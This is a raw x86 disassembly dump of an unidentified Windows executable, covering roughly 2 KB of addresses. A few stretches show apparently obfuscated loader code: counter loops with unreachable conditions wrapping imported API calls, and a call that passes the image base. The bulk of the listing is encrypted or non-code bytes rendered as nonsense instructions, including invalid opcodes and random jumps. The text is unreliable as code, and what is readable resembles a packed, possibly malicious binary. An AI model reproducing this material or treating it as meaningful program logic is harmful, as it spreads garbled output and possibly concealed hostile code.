  409ff7:	clc    
  409ff8:	or     DWORD PTR [edx-0xb],ebp
  409ffb:	icebp  
  409ffc:	adc    DWORD PTR [esi-0x6b],edi
  409fff:	inc    ecx
  40a000:	cli    
  40a001:	std    
  40a002:	xchg   ebp,eax
  40a003:	inc    ebp
  40a004:	jae    0x40a076
  40a006:	lea    ecx,[edx+0x57]
  40a009:	mov    ebp,0xd1836477
  40a00e:	jne    0x40a01a
  40a010:	aam    0xdf
  40a012:	mov    esi,0xba6a6a61
  40a017:	hlt    
  40a018:	ret    
  40a019:	sbb    BYTE PTR [ebp+0x313d4844],ch
  40a01f:	xor    esi,DWORD PTR [ecx+0x1f]
  40a022:	adc    DWORD PTR [edi+0x3e],edx
  40a025:	and    ch,BYTE PTR [eax+0x1]
  40a028:	sbb    edi,DWORD PTR [ecx+ebx*2]
  40a02b:	aam    0x11
  40a02d:	test   al,0x5b
  40a02f:	mov    al,0x2a
  40a031:	test   BYTE PTR [ebp+0x5629e8a8],cl
  40a037:	fwait
  40a038:	lds    eax,FWORD PTR ds:0x84d8be4
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x2260,0x9d
  40a1b4:	jmp    DWORD PTR [esi+0x7878f9e2]
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	pop    ebp
  40a1bf:	pop    ss
  40a1c0:	inc    ebp
  40a1c1:	mov    edx,0x37087ac6
  40a1c6:	xchg   BYTE PTR [ecx-0x27],dh
  40a1c9:	shr    DWORD PTR [eax],cl
  40a1cb:	icebp  
  40a1cc:	ss in  al,dx
  40a1ce:	mov    dh,0x18
  40a1d0:	ficomp DWORD PTR [edx-0x224c62e5]
  40a1d6:	xor    al,0x11
  40a1d8:	push   cs
  40a1d9:	test   eax,0x5bdbf0e0
  40a1de:	nop
  40a1df:	ja     0x40a1ba
  40a1e1:	pop    ds
  40a1e2:	iret   
  40a1e3:	adc    al,BYTE PTR [esp+edi*8+0x245fce45]
  40a1ea:	stos   DWORD PTR es:[edi],eax
  40a1eb:	into   
  40a1ec:	inc    eax
  40a1ed:	cmp    BYTE PTR [ecx-0x37e249ae],ch
  40a1f3:	arpl   bx,di
  40a1f5:	xlat   BYTE PTR ds:[ebx]
  40a1f6:	or     BYTE PTR [esi],bl
  40a1f8:	xor    bl,BYTE PTR [edi+0x237207d9]
  40a1fe:	aam    0xa3
  40a200:	idiv   bl
  40a202:	sbb    edi,eax
  40a204:	mov    ebp,0x73fde4af
  40a209:	jne    0x40a24c
  40a20b:	outs   dx,BYTE PTR ds:[esi]
  40a20c:	inc    esp
  40a20d:	cmp    cl,bh
  40a20f:	js     0x40a24d
  40a211:	mov    cl,dl
  40a213:	sbb    DWORD PTR [edx+0x310ad8ec],edx
  40a219:	xlat   BYTE PTR ds:[ebx]
  40a21a:	sub    eax,0x738a2fe6
  40a21f:	pop    esp
  40a220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a221:	adc    cl,BYTE PTR [ecx+0x70]
  40a224:	or     edx,ebx
  40a226:	js     0x40a1b5
  40a228:	lods   al,BYTE PTR ds:[esi]
  40a229:	es inc esp
  40a22b:	popa   
  40a22c:	xor    esi,0x35
  40a22f:	inc    eax
  40a230:	scas   eax,DWORD PTR es:[edi]
  40a231:	mov    edi,0x8ceb5510
  40a236:	stc    
  40a237:	pusha  
  40a238:	popf   
  40a239:	shr    BYTE PTR [eax+ebp*4],cl
  40a23c:	pop    ds
  40a23d:	push   ebp
  40a23e:	adc    BYTE PTR [eax+0x25],bh
  40a241:	stc    
  40a242:	shl    BYTE PTR [edx+0x7b],1
  40a245:	inc    ebx
  40a246:	(bad)  
  40a247:	pop    eax
  40a248:	mov    ds:0xe2aa2d72,eax
  40a24d:	test   BYTE PTR ds:[esi+0x36],bh
  40a251:	ins    BYTE PTR es:[edi],dx
  40a252:	in     eax,dx
  40a253:	xor    eax,0x438df876
  40a258:	out    0xa2,eax
  40a25a:	leave  
  40a25b:	sbb    eax,0x8672c009
  40a260:	push   eax
  40a261:	sbb    al,0xd1
  40a263:	dec    ecx
  40a264:	push   esp
  40a265:	fdiv   DWORD PTR [eax-0x6b]
  40a268:	jmp    0x5c6d87df
  40a26d:	push   edi
  40a26e:	adc    edx,esp
  40a270:	add    eax,0x4cd6f9f6
  40a275:	sub    ch,al
  40a277:	mov    esp,0x48dab9f6
  40a27c:	xchg   ebp,eax
  40a27d:	inc    esp
  40a27e:	lds    edx,FWORD PTR [esi+0xe]
  40a281:	sub    BYTE PTR [eax+0x13],dh
  40a284:	mov    edx,0xd4636433
  40a289:	xchg   edx,ebp
  40a28b:	mov    cl,0x4c
  40a28d:	mov    ebp,0x23b032ba
  40a292:	jne    0x40a2c7
  40a294:	fs rol ebp,cl
  40a297:	stos   DWORD PTR es:[edi],eax
  40a298:	mov    eax,ds:0x2e92887f
  40a29d:	daa    
  40a29e:	loope  0x40a23e
  40a2a0:	(bad)  
  40a2a2:	(bad)  
  40a2a3:	and    eax,DWORD PTR gs:0xe6ac2fe4
  40a2aa:	dec    edi
  40a2ab:	(bad)  
  40a2ad:	js     0x40a28f
  40a2af:	dec    ebp
  40a2b0:	pop    es
  40a2b1:	leave  
  40a2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2b3:	push   edi
  40a2b4:	imul   BYTE PTR [esi]
  40a2b6:	ins    DWORD PTR es:[edi],dx
  40a2b7:	(bad)  
  40a2b8:	sbb    al,0x36
  40a2ba:	ins    BYTE PTR es:[edi],dx
  40a2bb:	stos   DWORD PTR es:[edi],eax
  40a2bc:	pop    ebp
  40a2bd:	sub    ebp,DWORD PTR [edi]
  40a2bf:	or     BYTE PTR [esi+0x4c],ah
  40a2c2:	and    eax,0xe342ac4d
  40a2c7:	adc    eax,0xf0cf69bb
  40a2cc:	in     eax,dx
  40a2cd:	cwde   
  40a2ce:	mov    al,0x39
  40a2d0:	sub    eax,0x43beca76
  40a2d5:	js     0x40a334
  40a2d7:	cmp    bl,BYTE PTR [edx]
  40a2d9:	push   ds
  40a2da:	sbb    DWORD PTR ds:0xabfce3ab,eax
  40a2e0:	mov    ds:0x4fa864dd,al
  40a2e5:	jge    0x40a352
  40a2e7:	mov    ds:0xbbaca65e,eax
  40a2ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2ed:	pop    edx
  40a2ee:	je     0x40a29a
  40a2f0:	out    0x9a,eax
  40a2f2:	rcl    DWORD PTR [edi+0x7d],0xbb
  40a2f6:	mov    edi,DWORD PTR [eax]
  40a2f8:	fs mov cl,0xad
  40a2fb:	aad    0x7f
  40a2fd:	inc    edi
  40a2fe:	lods   al,BYTE PTR ds:[esi]
  40a2ff:	sub    dh,BYTE PTR [ebx-0x346b1855]
  40a305:	mov    ebp,0x35b0b687
  40a30a:	(bad)  
  40a30b:	mov    ecx,0x35516f1b
  40a310:	dec    esp
  40a311:	mov    ebx,0x6f1f71d6
  40a316:	imul   cx,WORD PTR [eax+0xf],0x35
  40a31b:	inc    ebx
  40a31c:	xchg   DWORD PTR [ebp-0x60b3135a],edi
  40a322:	pop    ss
  40a323:	retf   
  40a324:	mov    ch,BYTE PTR [ebx]
  40a326:	adc    eax,DWORD PTR [ebx-0x79]
  40a329:	jnp    0x40a313
  40a32b:	aas    
  40a32c:	cmp    edi,DWORD PTR [esp+eiz*2+0x19]
  40a330:	loopne 0x40a2e2
  40a332:	fimul  DWORD PTR [esi]
  40a334:	in     eax,dx
  40a335:	mov    al,dl
  40a337:	inc    edx
  40a338:	and    DWORD PTR ds:0x562647bd,edi
  40a33e:	pmulhw mm3,QWORD PTR ds:0x491d4fec
  40a345:	and    eax,0x1811ad89
  40a34a:	cmp    al,0xe1
  40a34c:	popf   
  40a34d:	jl     0x40a2d1
  40a34f:	xchg   ebx,eax
  40a350:	cs into 
  40a352:	scas   al,BYTE PTR es:[edi]
  40a353:	sbb    al,0x85
  40a355:	fstp   QWORD PTR [eax+0x33]
  40a358:	mov    WORD PTR [eax],cs
  40a35a:	shr    bh,0x2b
  40a35d:	lods   al,BYTE PTR ds:[esi]
  40a35e:	frstor [ecx-0x7b1685ef]
  40a364:	pop    ebp
  40a365:	scas   eax,DWORD PTR es:[edi]
  40a366:	vorps  xmm3,xmm6,XMMWORD PTR [ecx+ebx*2+0x56862607]
  40a36f:	sbb    al,0xe
  40a371:	pop    esp
  40a373:	and    DWORD PTR [ecx+ebx*1],ebx
  40a376:	(bad)  
  40a377:	jmp    0x40a3a7
  40a379:	inc    edi
  40a37a:	pushf  
  40a37b:	adc    dl,bl
  40a37d:	pop    es
  40a37e:	call   0xf361845
  40a383:	addr16 adc eax,0x9497f4c1
  40a389:	rcr    BYTE PTR [ecx+0x28881709],0x81
  40a390:	dec    esp
  40a391:	(bad)  
  40a392:	adc    al,0xf
  40a394:	mov    dl,0x9e
  40a396:	adc    eax,0xd801f333
  40a39b:	addr16 mov ebp,ebp
  40a39e:	jmp    0x20805e74
  40a3a3:	sbb    ah,BYTE PTR [ebx+0x280b56db]
  40a3a9:	jge    0x40a3d8
  40a3ab:	dec    ebx
  40a3ac:	sbb    eax,0x34c53937
  40a3b1:	jmp    0x4c9a:0xb3b10451
  40a3b8:	test   DWORD PTR [edx-0x3cc7a600],ecx
  40a3be:	in     al,dx
  40a3bf:	sub    DWORD PTR ds:[esi-0x47],edi
  40a3c3:	inc    ebp
  40a3c4:	xor    al,0x2
  40a3c6:	push   esp
  40a3c7:	mov    edx,0xee246a77
  40a3cc:	jg     0x40a3b0
  40a3ce:	pushf  
  40a3cf:	std    
  40a3d0:	inc    edx
  40a3d1:	xchg   esp,eax
  40a3d2:	cmp    DWORD PTR [esi+0x29],esi
  40a3d5:	ret    0xab1f
  40a3d8:	jne    0x40a43a
  40a3da:	mov    edx,0x9d394973
  40a3df:	pop    eax
  40a3e0:	ror    BYTE PTR [edx+0x4b],1
  40a3e3:	test   al,0xc9
  40a3e5:	jge    0x40a406
  40a3e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3e8:	mov    ebx,?
  40a3ea:	arpl   WORD PTR [ecx+0x57],dx
  40a3ed:	dec    esi
  40a3ee:	jge    0x40a3b3
  40a3f0:	xchg   cx,ax
  40a3f2:	iret   
  40a3f3:	xchg   ecx,eax
  40a3f4:	loope  0x40a45a
  40a3f6:	(bad)  
  40a3f7:	leave  
  40a3f8:	int    0x35
  40a3fa:	mov    cl,0xf2
  40a3fc:	jne    0x40a45e
  40a3fe:	push   es
  40a3ff:	repnz adc al,0x14
  40a402:	retf   0xd85e
  40a405:	(bad)  
  40a406:	int3   
  40a407:	outs   dx,DWORD PTR ds:[esi]
  40a408:	div    DWORD PTR [eax-0x5b]
  40a40b:	xchg   ecx,eax
  40a40c:	inc    edx
  40a40d:	ss nop
  40a40f:	imul   BYTE PTR [ebx+0x16d496a1]
  40a415:	cmp    cl,ah
  40a417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a418:	mov    cl,0xae
  40a41a:	adc    bl,BYTE PTR [ebx]
  40a41c:	lods   eax,DWORD PTR ds:[esi]
  40a41d:	mov    eax,0xa371639f
  40a422:	mov    eax,0x655faba4
  40a427:	pop    esp
  40a428:	call   0x51313c48
  40a42d:	dec    eax
  40a42e:	pop    ebx
  40a42f:	ret    
  40a430:	sub    ebx,DWORD PTR [edi]
  40a432:	mov    DWORD PTR [ebx-0x65],edx
  40a435:	imul   eax,DWORD PTR [edx-0x6a916f1c],0x63
  40a43c:	loop   0x40a45e
  40a43e:	pop    ebp
  40a43f:	adc    eax,0x429769da
  40a444:	adc    eax,0x37b7dd51
  40a449:	jne    0x40a4ab
  40a44b:	mov    gs,WORD PTR ds:0x2921acef
  40a451:	in     al,dx
  40a452:	out    0xb1,eax
  40a454:	fdivr  QWORD PTR [ebx+edx*4+0x35]
  40a458:	jb     0x40a3ff
  40a45a:	pusha  
  40a45b:	jcxz   0x40a44d
  40a45e:	pushf  
  40a45f:	cdq    
  40a460:	mov    eax,0x6e554259
  40a465:	pop    ebx
  40a466:	and    DWORD PTR [esp+eiz*8+0x4e],ecx
  40a46a:	push   eax
  40a46b:	add    al,0xa8
  40a46d:	inc    ecx
  40a46e:	aad    0xa5
  40a470:	sub    dh,BYTE PTR [edx]
  40a472:	cmp    al,0x0
  40a474:	(bad)  
  40a476:	retf   0x2938
  40a479:	test   al,0xb3
  40a47b:	dec    ebx
  40a47c:	cmp    cl,BYTE PTR [edi]
  40a47e:	inc    edx
  40a47f:	lea    eax,[edi+0xa7f7628]
  40a485:	call   0x2117:0xc02277a0
  40a48c:	out    dx,al
  40a48d:	sub    ecx,0xffffff8f
  40a490:	mov    edi,0x28d4c9fc
  40a495:	mov    esi,0xf35d646e
  40a49a:	pop    ds
  40a49b:	mov    ch,0x2c
  40a49d:	shl    BYTE PTR [edx+0x43a3df7b],1
  40a4a3:	or     ch,BYTE PTR [ebx]
  40a4a5:	iret   
  40a4a6:	fnsave [esi-0xa]
  40a4a9:	imul   esi,edi,0x3f
  40a4ac:	push   ebp
  40a4ad:	and    al,0xe4
  40a4af:	fscale 
  40a4b1:	cmp    DWORD PTR [ebp+esi*1+0x783868bb],ebp
  40a4b8:	pop    ds
  40a4b9:	fmul   DWORD PTR [ebp+0x2581dc45]
  40a4bf:	int    0xa7
  40a4c1:	inc    edx
  40a4c2:	add    ch,dh
  40a4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c5:	inc    edx
  40a4c6:	add    BYTE PTR [ecx+0x2d81d845],cl
  40a4cc:	mov    DWORD PTR [eax+0x30d00042],ebp
  40a4d2:	add    BYTE PTR [eax],al
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x54],dh
  40a61b:	sbb    BYTE PTR [ebp+0x78fede94],0x78
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	jl     0x40a681
  40a628:	or     esp,eax
  40a62a:	scas   eax,DWORD PTR es:[edi]
  40a62b:	fild   DWORD PTR [eax+0x40]
  40a62e:	mov    esp,0x68cd1e4c
  40a633:	cli    
  40a634:	cmp    eax,0xfffffff3
  40a637:	dec    eax
  40a638:	inc    esi
  40a639:	(bad)  
  40a63a:	std    
  40a63b:	jmp    ecx
  40a63d:	sub    cl,0x73
  40a640:	cmp    dl,BYTE PTR [ecx]
  40a642:	adc    eax,0xbf6f730b
  40a647:	adc    BYTE PTR [esi-0x8546482],dl
  40a64d:	aam    0x9e
  40a64f:	cli    
  40a650:	dec    ecx
  40a651:	loope  0x40a644
  40a653:	jp     0x40a644
  40a655:	fwait
  40a656:	in     eax,dx
  40a657:	frstor [eax-0x4538b8cd]
  40a65d:	and    al,0x4f
  40a65f:	add    bh,BYTE PTR [ecx]
  40a661:	dec    BYTE PTR [ecx]
  40a663:	sub    al,0xb4
  40a665:	fimul  DWORD PTR [ebx+0x7b]
  40a668:	push   esi
  40a669:	xor    DWORD PTR [edx],ecx
  40a66b:	dec    esi
  40a66c:	test   al,0x5
  40a66e:	retf   0xb23d
  40a671:	outs   dx,BYTE PTR ds:[esi]
  40a672:	rcr    DWORD PTR [edx],cl
  40a674:	mov    edx,esi
  40a676:	bound  ebx,QWORD PTR [edi]
  40a678:	push   cs
  40a679:	jmp    0x40a673
  40a67b:	aad    0x5e
  40a67d:	xchg   edi,eax
  40a67e:	(bad)  
  40a67f:	ss xchg ebx,eax
  40a681:	into   
  40a682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a683:	inc    ecx
  40a684:	jecxz  0x40a6a5
  40a686:	pop    eax
  40a687:	call   0xb89ae6d8
  40a68c:	mov    al,0x3f
  40a68e:	addr16 std 
  40a690:	jmp    0x66a8c6f3
  40a695:	pop    ds
  40a696:	push   ebx
  40a697:	cmp    dh,BYTE PTR [ebp+0x2b]
  40a69a:	sub    BYTE PTR [eax],0xa9
  40a69d:	sub    ch,BYTE PTR [ecx+0x343842ac]
  40a6a3:	(bad)  
  40a6a4:	cmp    al,ah
  40a6a6:	push   edx
  40a6a7:	mov    WORD PTR [ebx],ss
  40a6a9:	(bad)  
  40a6aa:	lods   eax,DWORD PTR ds:[esi]
  40a6ab:	cmp    dh,BYTE PTR [esi]
  40a6ad:	in     eax,0xd3
  40a6af:	(bad)  
  40a6b0:	fs repnz stos DWORD PTR es:[edi],eax
  40a6b3:	xchg   esp,eax
  40a6b4:	sub    DWORD PTR [edi],ebp
  40a6b6:	push   0xffffff96
  40a6b8:	int3   
  40a6b9:	int    0xac
  40a6bb:	stos   DWORD PTR es:[edi],eax
  40a6bc:	aam    0xff
  40a6be:	pusha  
  40a6bf:	fnstenv ss:[edx+ebp*8]
  40a6c3:	xchg   edx,eax
  40a6c4:	fist   WORD PTR [ebx+0x55d150d2]
  40a6ca:	mov    al,BYTE PTR [edi+0x5d95ca55]
  40a6d0:	out    0xb9,eax
  40a6d2:	jbe    0x40a742
  40a6d4:	in     eax,0x5e
  40a6d6:	lock or DWORD PTR [edx+0x14ac74b5],ecx
  40a6dd:	sar    DWORD PTR [ebp+0x39],0x60
  40a6e1:	imul   bp,WORD PTR [eax],0x27
  40a6e5:	add    edi,ebp
  40a6e7:	or     al,0x23
  40a6e9:	adc    al,BYTE PTR [esi+0x54]
  40a6ec:	mov    ecx,DWORD PTR [ecx]
  40a6ee:	imul   edx,DWORD PTR [eax],0xffffffe7
  40a6f1:	pop    es
  40a6f2:	cmp    eax,0x10b7c875
  40a6f7:	lds    ebx,FWORD PTR [ebp+0x8]
  40a6fa:	push   edx
  40a6fb:	cs out dx,eax
  40a6fd:	fistp  QWORD PTR [ecx]
  40a6ff:	in     eax,dx
  40a700:	adc    al,0x8c
  40a702:	icebp  
  40a703:	outs   dx,DWORD PTR ds:[esi]
  40a704:	sbb    eax,0x9f19eefc
  40a709:	out    dx,al
  40a70a:	add    eax,0xda0f360c
  40a70f:	cmp    eax,0x8b10c567
  40a714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a715:	test   DWORD PTR [edx+ebx*4-0x198740e9],esi
  40a71c:	neg    edi
  40a71e:	arpl   WORD PTR [edi],ax
  40a720:	mov    dl,0x36
  40a722:	js     0x40a705
  40a724:	mov    eax,0xdfad8f65
  40a729:	loop   0x40a6fd
  40a72b:	jp     0x40a724
  40a72d:	jbe    0x40a724
  40a72f:	cmp    eax,0x19f51028
  40a734:	cmp    BYTE PTR [edi+ecx*2+0x4c44652c],0x77
  40a73c:	ret    
  40a73d:	xlat   BYTE PTR ds:[ebx]
  40a73e:	xor    cl,bl
  40a740:	push   cs
  40a741:	bound  ecx,QWORD PTR [ebx]
  40a743:	dec    esi
  40a744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a745:	inc    edx
  40a746:	sub    eax,0x97cd12f3
  40a74b:	or     al,0xc7
  40a74d:	sahf   
  40a74e:	push   ebp
  40a74f:	push   0x78
  40a751:	or     BYTE PTR [esi-0x7e0ea74],dh
  40a757:	stos   DWORD PTR es:[edi],eax
  40a758:	inc    eax
  40a759:	or     al,0xeb
  40a75b:	xchg   esi,eax
  40a75c:	aas    
  40a75d:	repz ret 0xaa74
  40a761:	js     0x40a700
  40a763:	fisub  DWORD PTR [eax+0x7a405146]
  40a769:	sahf   
  40a76a:	push   ss
  40a76b:	inc    edx
  40a76c:	jae    0x40a724
  40a76e:	daa    
  40a76f:	inc    edi
  40a770:	nop
  40a771:	pop    esp
  40a772:	add    esp,DWORD PTR [esi+0x768c8c16]
  40a778:	retf   
  40a779:	pop    esi
  40a77a:	xchg   DWORD PTR [esi+esi*4],ebp
  40a77d:	lods   al,BYTE PTR ds:[esi]
  40a77e:	fldenv [edx-0x1c]
  40a781:	adc    al,0x9e
  40a783:	sbb    eax,DWORD PTR [eax]
  40a785:	mov    edx,0xcd05a3c0
  40a78a:	mov    ecx,DWORD PTR [ecx]
  40a78c:	mov    ch,0xeb
  40a78e:	dec    edx
  40a78f:	or     bh,BYTE PTR [edi+edx*2-0x32317b85]
  40a796:	dec    ebp
  40a797:	enter  0xacaf,0xa5
  40a79b:	loop   0x40a7db
  40a79d:	xor    eax,0x1a487d45
  40a7a2:	pop    ds
  40a7a3:	in     al,0xf6
  40a7a5:	rcl    BYTE PTR [ebx-0x114b4636],0x44
  40a7ac:	cli    
  40a7ad:	loopne 0x40a783
  40a7af:	cld    
  40a7b0:	pop    es
  40a7b1:	(bad)  
  40a7b2:	push   0x729a049a
  40a7b7:	repz mov esi,DWORD PTR [edx-0x49]
  40a7bb:	mov    esp,0x1aaeb9f9
  40a7c0:	rol    DWORD PTR [edi+0x7ed5823f],1
  40a7c6:	pop    ss
  40a7c7:	in     eax,dx
  40a7c8:	imul   ebx,DWORD PTR [edx],0xfcdf8701
  40a7ce:	and    BYTE PTR [ebp+0x13],0xf8
  40a7d2:	add    DWORD PTR [edx-0x55],ecx
  40a7d5:	or     ch,BYTE PTR [edi+0x78]
  40a7d8:	repz fisubr WORD PTR [ecx-0x1627d06f]
  40a7df:	leave  
  40a7e0:	jnp    0x40a788
  40a7e2:	shr    BYTE PTR [edx+0x3c68d874],1
  40a7e8:	xor    BYTE PTR [ebp+eiz*8-0x6d474604],dl
  40a7ef:	pop    edi
  40a7f0:	nop
  40a7f1:	mov    eax,0x4ea7a815
  40a7f6:	xchg   ebp,eax
  40a7f7:	mov    ebp,0x46ec4c92
  40a7fc:	mov    DWORD PTR [ebx+0x23],ebx
  40a7ff:	stos   BYTE PTR es:[edi],al
  40a800:	test   ah,ch
  40a802:	fstp   st(4)
  40a804:	or     DWORD PTR [edx+0x3f1814bb],0xffffff95
  40a80b:	icebp  
  40a80c:	pop    edx
  40a80d:	or     esi,edi
  40a80f:	cld    
  40a810:	adc    al,0xd0
  40a812:	mov    esi,0xebaee181
  40a817:	xor    BYTE PTR [ebx-0x14ab81b3],0x2e
  40a81e:	iret   
  40a81f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a820:	pop    es
  40a821:	push   ebp
  40a822:	mov    bl,0xa
  40a824:	cmc    
  40a825:	sahf   
  40a826:	mov    esp,0x7ae55391
  40a82b:	xchg   edx,eax
  40a82c:	cs dec esp
  40a82e:	pushf  
  40a82f:	mul    BYTE PTR [ebx]
  40a831:	fwait
  40a832:	aaa    
  40a833:	mov    dh,0x2e
  40a835:	sbb    esp,0xd87e33cd
  40a83b:	xor    eax,0x31994ccc
  40a840:	xchg   esi,eax
  40a841:	inc    ebx
  40a842:	ficomp WORD PTR [esi-0x46]
  40a845:	popf   
  40a846:	push   ds
  40a847:	mov    al,0x9b
  40a849:	xchg   esi,eax
  40a84a:	mov    ds:0xa36bd744,eax
  40a84f:	push   eax
  40a850:	jae    0x40a8b2
  40a852:	sar    DWORD PTR [edx+0x42],1
  40a855:	jmp    0x40a81c
  40a857:	cmp    esp,esi
  40a859:	mov    ah,0xb8
  40a85b:	add    eax,0xd4460416
  40a860:	(bad)  
  40a861:	cmp    esp,DWORD PTR [ebp-0x5d]
  40a864:	xchg   esi,eax
  40a865:	pop    edi
  40a866:	and    al,0x11
  40a868:	dec    edx
  40a869:	sti    
  40a86a:	sub    BYTE PTR [eax],cl
  40a86c:	xor    al,0x3d
  40a86e:	dec    ebp
  40a86f:	je     0x40a87d
  40a871:	daa    
  40a872:	sub    ebp,edi
